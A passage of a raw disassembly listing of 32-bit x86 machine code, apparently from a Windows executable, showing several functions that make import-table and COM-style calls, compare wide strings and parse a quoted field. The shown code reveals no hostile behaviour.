  4090bc:	8d bc 05 6c f3 ff ff 	lea    -0xc94(%ebp,%eax,1),%edi
  4090c3:	39 1f                	cmp    %ebx,(%edi)
  4090c5:	75 2d                	jne    0x4090f4
  4090c7:	ff b4 05 ac f9 ff ff 	push   -0x654(%ebp,%eax,1)
  4090ce:	ff 15 08 e1 40 00    	call   *0x40e108
  4090d4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4090d7:	8b 16                	mov    (%esi),%edx
  4090d9:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  4090dc:	8b 06                	mov    (%esi),%eax
  4090de:	39 1c 81             	cmp    %ebx,(%ecx,%eax,4)
  4090e1:	74 0e                	je     0x4090f1
  4090e3:	40                   	inc    %eax
  4090e4:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  4090ea:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4090ed:	89 06                	mov    %eax,(%esi)
  4090ef:	eb 09                	jmp    0x4090fa
  4090f1:	ff 45 fc             	incl   -0x4(%ebp)
  4090f4:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp)
  4090f8:	7d 07                	jge    0x409101
  4090fa:	8b 45 0c             	mov    0xc(%ebp),%eax
  4090fd:	39 06                	cmp    %eax,(%esi)
  4090ff:	7c ad                	jl     0x4090ae
  409101:	33 ff                	xor    %edi,%edi
  409103:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  409106:	7e 13                	jle    0x40911b
  409108:	ff b4 bd cc fc ff ff 	push   -0x334(%ebp,%edi,4)
  40910f:	ff 15 00 e1 40 00    	call   *0x40e100
  409115:	47                   	inc    %edi
  409116:	3b 7d f4             	cmp    -0xc(%ebp),%edi
  409119:	7c ed                	jl     0x409108
  40911b:	ff 75 f0             	push   -0x10(%ebp)
  40911e:	ff 15 00 e1 40 00    	call   *0x40e100
  409124:	33 c0                	xor    %eax,%eax
  409126:	39 1e                	cmp    %ebx,(%esi)
  409128:	0f 95 c0             	setne  %al
  40912b:	5f                   	pop    %edi
  40912c:	5b                   	pop    %ebx
  40912d:	c9                   	leave
  40912e:	c3                   	ret
  40912f:	55                   	push   %ebp
  409130:	8b ec                	mov    %esp,%ebp
  409132:	b8 00 40 00 00       	mov    $0x4000,%eax
  409137:	e8 74 44 00 00       	call   0x40d5b0
  40913c:	57                   	push   %edi
  40913d:	8b f9                	mov    %ecx,%edi
  40913f:	8d 95 00 c0 ff ff    	lea    -0x4000(%ebp),%edx
  409145:	e8 00 e0 ff ff       	call   0x40714a
  40914a:	8b 15 00 3c 42 00    	mov    0x423c00,%edx
  409150:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  409156:	50                   	push   %eax
  409157:	e8 b5 c3 ff ff       	call   0x405511
  40915c:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  409162:	50                   	push   %eax
  409163:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  409169:	50                   	push   %eax
  40916a:	e8 ba c3 ff ff       	call   0x405529
  40916f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  409172:	8d 95 00 c0 ff ff    	lea    -0x4000(%ebp),%edx
  409178:	e8 cd df ff ff       	call   0x40714a
  40917d:	b9 f0 ee 40 00       	mov    $0x40eef0,%ecx
  409182:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  409188:	e8 60 c3 ff ff       	call   0x4054ed
  40918d:	8d 8d 00 c0 ff ff    	lea    -0x4000(%ebp),%ecx
  409193:	e8 55 c3 ff ff       	call   0x4054ed
  409198:	ff 75 08             	push   0x8(%ebp)
  40919b:	ba e0 ed 40 00       	mov    $0x40ede0,%edx
  4091a0:	e8 6c c3 ff ff       	call   0x405511
  4091a5:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  4091ab:	50                   	push   %eax
  4091ac:	ff 75 08             	push   0x8(%ebp)
  4091af:	e8 75 c3 ff ff       	call   0x405529
  4091b4:	83 c4 18             	add    $0x18,%esp
  4091b7:	33 c0                	xor    %eax,%eax
  4091b9:	40                   	inc    %eax
  4091ba:	5f                   	pop    %edi
  4091bb:	c9                   	leave
  4091bc:	c3                   	ret
  4091bd:	55                   	push   %ebp
  4091be:	8b ec                	mov    %esp,%ebp
  4091c0:	81 ec c8 00 00 00    	sub    $0xc8,%esp
  4091c6:	56                   	push   %esi
  4091c7:	e8 b6 13 00 00       	call   0x40a582
  4091cc:	8b f0                	mov    %eax,%esi
  4091ce:	85 f6                	test   %esi,%esi
  4091d0:	75 04                	jne    0x4091d6
  4091d2:	33 c0                	xor    %eax,%eax
  4091d4:	eb 31                	jmp    0x409207
  4091d6:	57                   	push   %edi
  4091d7:	68 00 ef 40 00       	push   $0x40ef00
  4091dc:	56                   	push   %esi
  4091dd:	8d 85 38 ff ff ff    	lea    -0xc8(%ebp),%eax
  4091e3:	6a 64                	push   $0x64
  4091e5:	50                   	push   %eax
  4091e6:	e8 6a 04 00 00       	call   0x409655
  4091eb:	83 c4 10             	add    $0x10,%esp
  4091ee:	56                   	push   %esi
  4091ef:	8b f8                	mov    %eax,%edi
  4091f1:	ff 15 00 e1 40 00    	call   *0x40e100
  4091f7:	85 ff                	test   %edi,%edi
  4091f9:	5f                   	pop    %edi
  4091fa:	74 d6                	je     0x4091d2
  4091fc:	8d 85 38 ff ff ff    	lea    -0xc8(%ebp),%eax
  409202:	e8 cd c3 ff ff       	call   0x4055d4
  409207:	5e                   	pop    %esi
  409208:	c9                   	leave
  409209:	c3                   	ret
  40920a:	55                   	push   %ebp
  40920b:	8b ec                	mov    %esp,%ebp
  40920d:	b8 6c 40 00 00       	mov    $0x406c,%eax
  409212:	e8 99 43 00 00       	call   0x40d5b0
  409217:	8b 15 d8 14 41 00    	mov    0x4114d8,%edx
  40921d:	56                   	push   %esi
  40921e:	33 f6                	xor    %esi,%esi
  409220:	39 35 b8 3e 42 00    	cmp    %esi,0x423eb8
  409226:	74 76                	je     0x40929e
  409228:	8d 85 98 bf ff ff    	lea    -0x4068(%ebp),%eax
  40922e:	50                   	push   %eax
  40922f:	e8 dd c2 ff ff       	call   0x405511
  409234:	39 35 90 9f 41 00    	cmp    %esi,0x419f90
  40923a:	59                   	pop    %ecx
  40923b:	7e 58                	jle    0x409295
  40923d:	8b 0c b5 40 06 42 00 	mov    0x420640(,%esi,4),%ecx
  409244:	8d 85 98 bf ff ff    	lea    -0x4068(%ebp),%eax
  40924a:	e8 9e c2 ff ff       	call   0x4054ed
  40924f:	8b 04 b5 40 39 42 00 	mov    0x423940(,%esi,4),%eax
  409256:	66 83 38 69          	cmpw   $0x69,(%eax)
  40925a:	75 15                	jne    0x409271
  40925c:	8d 48 04             	lea    0x4(%eax),%ecx
  40925f:	e8 2d ee ff ff       	call   0x408091
  409264:	52                   	push   %edx
  409265:	50                   	push   %eax
  409266:	8d 45 98             	lea    -0x68(%ebp),%eax
  409269:	e8 47 c5 ff ff       	call   0x4057b5
  40926e:	59                   	pop    %ecx
  40926f:	eb 0c                	jmp    0x40927d
  409271:	8d 50 04             	lea    0x4(%eax),%edx
  409274:	8d 45 98             	lea    -0x68(%ebp),%eax
  409277:	50                   	push   %eax
  409278:	e8 94 c2 ff ff       	call   0x405511
  40927d:	59                   	pop    %ecx
  40927e:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  409281:	8d 85 98 bf ff ff    	lea    -0x4068(%ebp),%eax
  409287:	e8 61 c2 ff ff       	call   0x4054ed
  40928c:	46                   	inc    %esi
  40928d:	3b 35 90 9f 41 00    	cmp    0x419f90,%esi
  409293:	7c a8                	jl     0x40923d
  409295:	8d 85 98 bf ff ff    	lea    -0x4068(%ebp),%eax
  40929b:	50                   	push   %eax
  40929c:	eb 01                	jmp    0x40929f
  40929e:	52                   	push   %edx
  40929f:	ff 15 08 e1 40 00    	call   *0x40e108
  4092a5:	5e                   	pop    %esi
  4092a6:	c9                   	leave
  4092a7:	c3                   	ret
  4092a8:	55                   	push   %ebp
  4092a9:	8b ec                	mov    %esp,%ebp
  4092ab:	51                   	push   %ecx
  4092ac:	51                   	push   %ecx
  4092ad:	8b 08                	mov    (%eax),%ecx
  4092af:	56                   	push   %esi
  4092b0:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4092b3:	52                   	push   %edx
  4092b4:	50                   	push   %eax
  4092b5:	ff 51 48             	call   *0x48(%ecx)
  4092b8:	85 c0                	test   %eax,%eax
  4092ba:	7c 3b                	jl     0x4092f7
  4092bc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4092bf:	8b 08                	mov    (%eax),%ecx
  4092c1:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4092c4:	52                   	push   %edx
  4092c5:	68 e8 e1 40 00       	push   $0x40e1e8
  4092ca:	50                   	push   %eax
  4092cb:	ff 11                	call   *(%ecx)
  4092cd:	8b f0                	mov    %eax,%esi
  4092cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4092d2:	8b 08                	mov    (%eax),%ecx
  4092d4:	50                   	push   %eax
  4092d5:	ff 51 08             	call   *0x8(%ecx)
  4092d8:	85 f6                	test   %esi,%esi
  4092da:	7c 1b                	jl     0x4092f7
  4092dc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4092df:	ff 75 08             	push   0x8(%ebp)
  4092e2:	8b 08                	mov    (%eax),%ecx
  4092e4:	50                   	push   %eax
  4092e5:	ff 51 44             	call   *0x44(%ecx)
  4092e8:	8b f0                	mov    %eax,%esi
  4092ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4092ed:	8b 08                	mov    (%eax),%ecx
  4092ef:	50                   	push   %eax
  4092f0:	ff 51 08             	call   *0x8(%ecx)
  4092f3:	85 f6                	test   %esi,%esi
  4092f5:	7d 04                	jge    0x4092fb
  4092f7:	33 c0                	xor    %eax,%eax
  4092f9:	eb 03                	jmp    0x4092fe
  4092fb:	33 c0                	xor    %eax,%eax
  4092fd:	40                   	inc    %eax
  4092fe:	5e                   	pop    %esi
  4092ff:	c9                   	leave
  409300:	c3                   	ret
  409301:	55                   	push   %ebp
  409302:	8b ec                	mov    %esp,%ebp
  409304:	83 ec 28             	sub    $0x28,%esp
  409307:	56                   	push   %esi
  409308:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40930b:	8b f0                	mov    %eax,%esi
  40930d:	8b 06                	mov    (%esi),%eax
  40930f:	51                   	push   %ecx
  409310:	56                   	push   %esi
  409311:	ff 50 4c             	call   *0x4c(%eax)
  409314:	85 c0                	test   %eax,%eax
  409316:	7c 0e                	jl     0x409326
  409318:	66 83 7d fc 00       	cmpw   $0x0,-0x4(%ebp)
  40931d:	75 07                	jne    0x409326
  40931f:	33 c0                	xor    %eax,%eax
  409321:	e9 d9 00 00 00       	jmp    0x4093ff
  409326:	8b 06                	mov    (%esi),%eax
  409328:	57                   	push   %edi
  409329:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40932c:	51                   	push   %ecx
  40932d:	56                   	push   %esi
  40932e:	ff 50 78             	call   *0x78(%eax)
  409331:	85 c0                	test   %eax,%eax
  409333:	8b 3d 00 e1 40 00    	mov    0x40e100,%edi
  409339:	7c 29                	jl     0x409364
  40933b:	ff 75 f8             	push   -0x8(%ebp)
  40933e:	ff 15 44 e1 40 00    	call   *0x40e144
  409344:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409347:	68 cc eb 40 00       	push   $0x40ebcc
  40934c:	e8 42 c1 ff ff       	call   0x405493
  409351:	85 c0                	test   %eax,%eax
  409353:	59                   	pop    %ecx
  409354:	ff 75 f8             	push   -0x8(%ebp)
  409357:	75 09                	jne    0x409362
  409359:	ff d7                	call   *%edi
  40935b:	33 c0                	xor    %eax,%eax
  40935d:	e9 9c 00 00 00       	jmp    0x4093fe
  409362:	ff d7                	call   *%edi
  409364:	8b 06                	mov    (%esi),%eax
  409366:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
  40936a:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40936d:	51                   	push   %ecx
  40936e:	56                   	push   %esi
  40936f:	ff 50 48             	call   *0x48(%eax)
  409372:	85 c0                	test   %eax,%eax
  409374:	0f 8c 81 00 00 00    	jl     0x4093fb
  40937a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40937d:	8b 08                	mov    (%eax),%ecx
  40937f:	8d 55 ec             	lea    -0x14(%ebp),%edx
  409382:	52                   	push   %edx
  409383:	68 e8 e1 40 00       	push   $0x40e1e8
  409388:	50                   	push   %eax
  409389:	ff 11                	call   *(%ecx)
  40938b:	8b f0                	mov    %eax,%esi
  40938d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409390:	8b 08                	mov    (%eax),%ecx
  409392:	50                   	push   %eax
  409393:	ff 51 08             	call   *0x8(%ecx)
  409396:	85 f6                	test   %esi,%esi
  409398:	7c 61                	jl     0x4093fb
  40939a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40939d:	8b 08                	mov    (%eax),%ecx
  40939f:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4093a2:	52                   	push   %edx
  4093a3:	50                   	push   %eax
  4093a4:	ff 91 b0 01 00 00    	call   *0x1b0(%ecx)
  4093aa:	85 c0                	test   %eax,%eax
  4093ac:	7c 44                	jl     0x4093f2
  4093ae:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  4093b4:	53                   	push   %ebx
  4093b5:	ff 75 08             	push   0x8(%ebp)
  4093b8:	ff d6                	call   *%esi
  4093ba:	68 1c ef 40 00       	push   $0x40ef1c
  4093bf:	8b d8                	mov    %eax,%ebx
  4093c1:	ff d6                	call   *%esi
  4093c3:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4093c6:	52                   	push   %edx
  4093c7:	8b f0                	mov    %eax,%esi
  4093c9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4093cc:	8b 08                	mov    (%eax),%ecx
  4093ce:	56                   	push   %esi
  4093cf:	53                   	push   %ebx
  4093d0:	50                   	push   %eax
  4093d1:	ff 91 10 01 00 00    	call   *0x110(%ecx)
  4093d7:	85 c0                	test   %eax,%eax
  4093d9:	7c 07                	jl     0x4093e2
  4093db:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  4093e2:	53                   	push   %ebx
  4093e3:	ff d7                	call   *%edi
  4093e5:	56                   	push   %esi
  4093e6:	ff d7                	call   *%edi
  4093e8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4093eb:	8b 08                	mov    (%eax),%ecx
  4093ed:	50                   	push   %eax
  4093ee:	ff 51 08             	call   *0x8(%ecx)
  4093f1:	5b                   	pop    %ebx
  4093f2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4093f5:	8b 08                	mov    (%eax),%ecx
  4093f7:	50                   	push   %eax
  4093f8:	ff 51 08             	call   *0x8(%ecx)
  4093fb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4093fe:	5f                   	pop    %edi
  4093ff:	5e                   	pop    %esi
  409400:	c9                   	leave
  409401:	c3                   	ret
  409402:	55                   	push   %ebp
  409403:	8b ec                	mov    %esp,%ebp
  409405:	8b 45 0c             	mov    0xc(%ebp),%eax
  409408:	8b 08                	mov    (%eax),%ecx
  40940a:	56                   	push   %esi
  40940b:	8d 55 0c             	lea    0xc(%ebp),%edx
  40940e:	52                   	push   %edx
  40940f:	50                   	push   %eax
  409410:	33 f6                	xor    %esi,%esi
  409412:	ff 51 20             	call   *0x20(%ecx)
  409415:	85 c0                	test   %eax,%eax
  409417:	7d 04                	jge    0x40941d
  409419:	33 c0                	xor    %eax,%eax
  40941b:	eb 25                	jmp    0x409442
  40941d:	39 75 0c             	cmp    %esi,0xc(%ebp)
  409420:	74 15                	je     0x409437
  409422:	8b 45 0c             	mov    0xc(%ebp),%eax
  409425:	68 34 ef 40 00       	push   $0x40ef34
  40942a:	e8 64 c0 ff ff       	call   0x405493
  40942f:	85 c0                	test   %eax,%eax
  409431:	59                   	pop    %ecx
  409432:	74 03                	je     0x409437
  409434:	33 f6                	xor    %esi,%esi
  409436:	46                   	inc    %esi
  409437:	ff 75 0c             	push   0xc(%ebp)
  40943a:	ff 15 00 e1 40 00    	call   *0x40e100
  409440:	8b c6                	mov    %esi,%eax
  409442:	5e                   	pop    %esi
  409443:	5d                   	pop    %ebp
  409444:	c3                   	ret
  409445:	55                   	push   %ebp
  409446:	8b ec                	mov    %esp,%ebp
  409448:	51                   	push   %ecx
  409449:	56                   	push   %esi
  40944a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40944d:	8b 06                	mov    (%esi),%eax
  40944f:	57                   	push   %edi
  409450:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409453:	51                   	push   %ecx
  409454:	56                   	push   %esi
  409455:	33 ff                	xor    %edi,%edi
  409457:	ff 50 20             	call   *0x20(%eax)
  40945a:	85 c0                	test   %eax,%eax
  40945c:	7d 04                	jge    0x409462
  40945e:	33 c0                	xor    %eax,%eax
  409460:	eb 50                	jmp    0x4094b2
  409462:	8b 06                	mov    (%esi),%eax
  409464:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  409467:	51                   	push   %ecx
  409468:	56                   	push   %esi
  409469:	ff 50 28             	call   *0x28(%eax)
  40946c:	85 c0                	test   %eax,%eax
  40946e:	7c ee                	jl     0x40945e
  409470:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  409473:	74 2b                	je     0x4094a0
  409475:	8b 45 0c             	mov    0xc(%ebp),%eax
  409478:	68 64 ef 40 00       	push   $0x40ef64
  40947d:	e8 11 c0 ff ff       	call   0x405493
  409482:	85 c0                	test   %eax,%eax
  409484:	59                   	pop    %ecx
  409485:	74 19                	je     0x4094a0
  409487:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40948a:	3b c7                	cmp    %edi,%eax
  40948c:	74 12                	je     0x4094a0
  40948e:	68 8c ef 40 00       	push   $0x40ef8c
  409493:	e8 fb bf ff ff       	call   0x405493
  409498:	85 c0                	test   %eax,%eax
  40949a:	59                   	pop    %ecx
  40949b:	74 03                	je     0x4094a0
  40949d:	33 ff                	xor    %edi,%edi
  40949f:	47                   	inc    %edi
  4094a0:	ff 75 0c             	push   0xc(%ebp)
  4094a3:	8b 35 00 e1 40 00    	mov    0x40e100,%esi
  4094a9:	ff d6                	call   *%esi
  4094ab:	ff 75 fc             	push   -0x4(%ebp)
  4094ae:	ff d6                	call   *%esi
  4094b0:	8b c7                	mov    %edi,%eax
  4094b2:	5f                   	pop    %edi
  4094b3:	5e                   	pop    %esi
  4094b4:	c9                   	leave
  4094b5:	c3                   	ret
  4094b6:	55                   	push   %ebp
  4094b7:	8b ec                	mov    %esp,%ebp
  4094b9:	8b 45 08             	mov    0x8(%ebp),%eax
  4094bc:	8b 08                	mov    (%eax),%ecx
  4094be:	83 ec 0c             	sub    $0xc,%esp
  4094c1:	8d 55 08             	lea    0x8(%ebp),%edx
  4094c4:	52                   	push   %edx
  4094c5:	50                   	push   %eax
  4094c6:	ff 51 78             	call   *0x78(%ecx)
  4094c9:	85 c0                	test   %eax,%eax
  4094cb:	7d 04                	jge    0x4094d1
  4094cd:	33 c0                	xor    %eax,%eax
  4094cf:	c9                   	leave
  4094d0:	c3                   	ret
  4094d1:	53                   	push   %ebx
  4094d2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4094d5:	8b 03                	mov    (%ebx),%eax
  4094d7:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4094da:	51                   	push   %ecx
  4094db:	53                   	push   %ebx
  4094dc:	ff 50 60             	call   *0x60(%eax)
  4094df:	85 c0                	test   %eax,%eax
  4094e1:	7d 10                	jge    0x4094f3
  4094e3:	ff 75 08             	push   0x8(%ebp)
  4094e6:	ff 15 00 e1 40 00    	call   *0x40e100
  4094ec:	33 c0                	xor    %eax,%eax
  4094ee:	e9 8b 00 00 00       	jmp    0x40957e
  4094f3:	56                   	push   %esi
  4094f4:	8b 35 44 e1 40 00    	mov    0x40e144,%esi
  4094fa:	57                   	push   %edi
  4094fb:	ff 75 fc             	push   -0x4(%ebp)
  4094fe:	ff d6                	call   *%esi
  409500:	ff 75 08             	push   0x8(%ebp)
  409503:	ff d6                	call   *%esi
  409505:	8b 45 08             	mov    0x8(%ebp),%eax
  409508:	85 c0                	test   %eax,%eax
  40950a:	8b 3d 00 e1 40 00    	mov    0x40e100,%edi
  409510:	74 4e                	je     0x409560
  409512:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  409516:	74 48                	je     0x409560
  409518:	ff 75 fc             	push   -0x4(%ebp)
  40951b:	e8 73 bf ff ff       	call   0x405493
  409520:	85 c0                	test   %eax,%eax
  409522:	59                   	pop    %ecx
  409523:	74 3b                	je     0x409560
  409525:	8b 03                	mov    (%ebx),%eax
  409527:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40952a:	51                   	push   %ecx
  40952b:	53                   	push   %ebx
  40952c:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  409533:	ff 50 20             	call   *0x20(%eax)
  409536:	85 c0                	test   %eax,%eax
  409538:	7c 35                	jl     0x40956f
  40953a:	ff 75 f8             	push   -0x8(%ebp)
  40953d:	ff d6                	call   *%esi
  40953f:	be 60 10 41 00       	mov    $0x411060,%esi
  409544:	ff 36                	push   (%esi)
  409546:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409549:	e8 45 bf ff ff       	call   0x405493
  40954e:	85 c0                	test   %eax,%eax
  409550:	59                   	pop    %ecx
  409551:	75 13                	jne    0x409566
  409553:	83 c6 04             	add    $0x4,%esi
  409556:	81 fe a4 10 41 00    	cmp    $0x4110a4,%esi
  40955c:	7c e6                	jl     0x409544
  40955e:	eb 0a                	jmp    0x40956a
  409560:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  409564:	eb 09                	jmp    0x40956f
  409566:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  40956a:	ff 75 f8             	push   -0x8(%ebp)
  40956d:	ff d7                	call   *%edi
  40956f:	ff 75 08             	push   0x8(%ebp)
  409572:	ff d7                	call   *%edi
  409574:	ff 75 fc             	push   -0x4(%ebp)
  409577:	ff d7                	call   *%edi
  409579:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40957c:	5f                   	pop    %edi
  40957d:	5e                   	pop    %esi
  40957e:	5b                   	pop    %ebx
  40957f:	c9                   	leave
  409580:	c3                   	ret
  409581:	55                   	push   %ebp
  409582:	8b ec                	mov    %esp,%ebp
  409584:	8b 03                	mov    (%ebx),%eax
  409586:	83 ec 0c             	sub    $0xc,%esp
  409589:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40958c:	51                   	push   %ecx
  40958d:	53                   	push   %ebx
  40958e:	ff 50 60             	call   *0x60(%eax)
  409591:	85 c0                	test   %eax,%eax
  409593:	7d 04                	jge    0x409599
  409595:	33 c0                	xor    %eax,%eax
  409597:	c9                   	leave
  409598:	c3                   	ret
  409599:	56                   	push   %esi
  40959a:	8b 35 44 e1 40 00    	mov    0x40e144,%esi
  4095a0:	57                   	push   %edi
  4095a1:	ff 75 f8             	push   -0x8(%ebp)
  4095a4:	ff d6                	call   *%esi
  4095a6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4095a9:	85 c0                	test   %eax,%eax
  4095ab:	8b 3d 00 e1 40 00    	mov    0x40e100,%edi
  4095b1:	74 48                	je     0x4095fb
  4095b3:	ff 75 08             	push   0x8(%ebp)
  4095b6:	e8 d8 be ff ff       	call   0x405493
  4095bb:	85 c0                	test   %eax,%eax
  4095bd:	59                   	pop    %ecx
  4095be:	74 3b                	je     0x4095fb
  4095c0:	8b 03                	mov    (%ebx),%eax
  4095c2:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4095c5:	51                   	push   %ecx
  4095c6:	53                   	push   %ebx
  4095c7:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4095ce:	ff 50 20             	call   *0x20(%eax)
  4095d1:	85 c0                	test   %eax,%eax
  4095d3:	7c 35                	jl     0x40960a
  4095d5:	ff 75 fc             	push   -0x4(%ebp)
  4095d8:	ff d6                	call   *%esi
  4095da:	be 60 10 41 00       	mov    $0x411060,%esi
  4095df:	ff 36                	push   (%esi)
  4095e1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4095e4:	e8 aa be ff ff       	call   0x405493
  4095e9:	85 c0                	test   %eax,%eax
  4095eb:	59                   	pop    %ecx
  4095ec:	75 13                	jne    0x409601
  4095ee:	83 c6 04             	add    $0x4,%esi
  4095f1:	81 fe a4 10 41 00    	cmp    $0x4110a4,%esi
  4095f7:	7c e6                	jl     0x4095df
  4095f9:	eb 0a                	jmp    0x409605
  4095fb:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4095ff:	eb 09                	jmp    0x40960a
  409601:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  409605:	ff 75 fc             	push   -0x4(%ebp)
  409608:	ff d7                	call   *%edi
  40960a:	ff 75 f8             	push   -0x8(%ebp)
  40960d:	ff d7                	call   *%edi
  40960f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409612:	5f                   	pop    %edi
  409613:	5e                   	pop    %esi
  409614:	c9                   	leave
  409615:	c3                   	ret
  409616:	55                   	push   %ebp
  409617:	8b ec                	mov    %esp,%ebp
  409619:	56                   	push   %esi
  40961a:	33 f6                	xor    %esi,%esi
  40961c:	39 75 10             	cmp    %esi,0x10(%ebp)
  40961f:	7e 2a                	jle    0x40964b
  409621:	8b 45 0c             	mov    0xc(%ebp),%eax
  409624:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  409627:	85 c0                	test   %eax,%eax
  409629:	74 1a                	je     0x409645
  40962b:	66 8b 4d 14          	mov    0x14(%ebp),%cx
  40962f:	66 3b 08             	cmp    (%eax),%cx
  409632:	75 11                	jne    0x409645
  409634:	83 c0 04             	add    $0x4,%eax
  409637:	50                   	push   %eax
  409638:	8b 45 08             	mov    0x8(%ebp),%eax
  40963b:	e8 53 be ff ff       	call   0x405493
  409640:	85 c0                	test   %eax,%eax
  409642:	59                   	pop    %ecx
  409643:	75 0b                	jne    0x409650
  409645:	46                   	inc    %esi
  409646:	3b 75 10             	cmp    0x10(%ebp),%esi
  409649:	7c d6                	jl     0x409621
  40964b:	33 c0                	xor    %eax,%eax
  40964d:	5e                   	pop    %esi
  40964e:	5d                   	pop    %ebp
  40964f:	c3                   	ret
  409650:	33 c0                	xor    %eax,%eax
  409652:	40                   	inc    %eax
  409653:	eb f8                	jmp    0x40964d
  409655:	55                   	push   %ebp
  409656:	8b ec                	mov    %esp,%ebp
  409658:	8b 45 08             	mov    0x8(%ebp),%eax
  40965b:	66 83 20 00          	andw   $0x0,(%eax)
  40965f:	8b 45 10             	mov    0x10(%ebp),%eax
  409662:	53                   	push   %ebx
  409663:	56                   	push   %esi
  409664:	57                   	push   %edi
  409665:	ff 75 14             	push   0x14(%ebp)
  409668:	e8 26 be ff ff       	call   0x405493
  40966d:	8b f0                	mov    %eax,%esi
  40966f:	85 f6                	test   %esi,%esi
  409671:	59                   	pop    %ecx
  409672:	0f 84 a4 00 00 00    	je     0x40971c
  409678:	68 9c ef 40 00       	push   $0x40ef9c
  40967d:	e8 11 be ff ff       	call   0x405493
  409682:	8b f8                	mov    %eax,%edi
  409684:	85 ff                	test   %edi,%edi
  409686:	59                   	pop    %ecx
  409687:	0f 84 8f 00 00 00    	je     0x40971c
  40968d:	ff 75 14             	push   0x14(%ebp)
  409690:	e8 bc bd ff ff       	call   0x405451
  409695:	59                   	pop    %ecx
  409696:	8d 34 46             	lea    (%esi,%eax,2),%esi
  409699:	eb 0b                	jmp    0x4096a6
  40969b:	3b f7                	cmp    %edi,%esi
  40969d:	73 1b                	jae    0x4096ba
  40969f:	66 85 c0             	test   %ax,%ax
  4096a2:	74 16                	je     0x4096ba
  4096a4:	46                   	inc    %esi
  4096a5:	46                   	inc    %esi
  4096a6:	0f b7 06             	movzwl (%esi),%eax
  4096a9:	66 3d 3a 00          	cmp    $0x3a,%ax
  4096ad:	75 ec                	jne    0x40969b
  4096af:	eb 09                	jmp    0x4096ba
  4096b1:	3b f7                	cmp    %edi,%esi
  4096b3:	73 15                	jae    0x4096ca
  4096b5:	66 85 db             	test   %bx,%bx
  4096b8:	74 10                	je     0x4096ca
  4096ba:	46                   	inc    %esi
  4096bb:	46                   	inc    %esi
  4096bc:	0f b7 1e             	movzwl (%esi),%ebx
  4096bf:	8b c3                	mov    %ebx,%eax
  4096c1:	e8 f5 be ff ff       	call   0x4055bb
  4096c6:	85 c0                	test   %eax,%eax
  4096c8:	75 e7                	jne    0x4096b1
  4096ca:	66 83 3e 22          	cmpw   $0x22,(%esi)
  4096ce:	75 0d                	jne    0x4096dd
  4096d0:	46                   	inc    %esi
  4096d1:	46                   	inc    %esi
  4096d2:	eb 09                	jmp    0x4096dd
  4096d4:	3b f7                	cmp    %edi,%esi
  4096d6:	73 15                	jae    0x4096ed
  4096d8:	66 85 db             	test   %bx,%bx
  4096db:	74 10                	je     0x4096ed
  4096dd:	4f                   	dec    %edi
  4096de:	4f                   	dec    %edi
  4096df:	0f b7 1f             	movzwl (%edi),%ebx
  4096e2:	8b c3                	mov    %ebx,%eax
  4096e4:	e8 d2 be ff ff       	call   0x4055bb
  4096e9:	85 c0                	test   %eax,%eax
  4096eb:	75 e7                	jne    0x4096d4
  4096ed:	66 83 3f 22          	cmpw   $0x22,(%edi)
  4096f1:	74 02                	je     0x4096f5
  4096f3:	47                   	inc    %edi
  4096f4:	47                   	inc    %edi
  4096f5:	3b fe                	cmp    %esi,%edi
  4096f7:	72 23                	jb     0x40971c
  4096f9:	2b fe                	sub    %esi,%edi
  4096fb:	d1 ff                	sar    $1,%edi
